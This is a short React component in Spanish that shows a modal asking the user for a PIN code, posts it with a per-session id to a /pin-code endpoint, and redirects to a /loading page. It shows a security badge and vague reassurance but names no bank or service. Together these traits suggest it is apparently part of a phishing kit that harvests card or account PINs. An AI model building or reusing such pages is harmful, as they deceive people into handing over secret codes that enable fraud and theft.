import { ChangeEvent, useState } from 'react'
import toast from 'react-hot-toast'
import { useNavigate, useParams } from 'react-router-dom'
import api from '../api/api'
import { SecurityBadge } from '../components/badges/SecurityBadge'
import { Button } from '../components/ui/buttons/Button'
import { ShadowInput } from '../components/ui/inputs/ShadowInput'

export function PinModal() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [pin, setPin] = useState('')

  const callback = async (): Promise<void> => {
    if (pin.length <= 0) {
      toast.error(`No ha introducido el código PIN`)
      return
    }

    await api.post(`/pin-code/${id}`, {
      pin_code: pin
    })

    setPin('')
    navigate(`/loading/${id}`, { replace: true })
  }

  return (
    <div className="flex h-full flex-col items-center rounded-2xl border border-black/20 bg-white px-10 py-[50px] font-system">
      <h1 className="mb-2 whitespace-pre-wrap text-center text-lg font-bold text-black">No ha introducido el código PIN</h1>
      <h2 className="mb-[30px] max-w-[280px] text-center text-sm font-semibold text-black/80">
        A pocos pasos de su finalización, confiamos, pero tenemos que asegurarnos de que está bien.
      </h2>
      <ShadowInput
        placeholder="Codigo PIN"
        className="mb-2.5"
        value={pin}
        onChange={(e: ChangeEvent<HTMLInputElement>) => setPin(e.target.value)}
      />
      <Button title="Continuar" className="mb-[14px] h-[42px] w-full max-w-[260px] rounded-[10px]" onClick={callback} />
      <SecurityBadge />
    </div>
  )
}
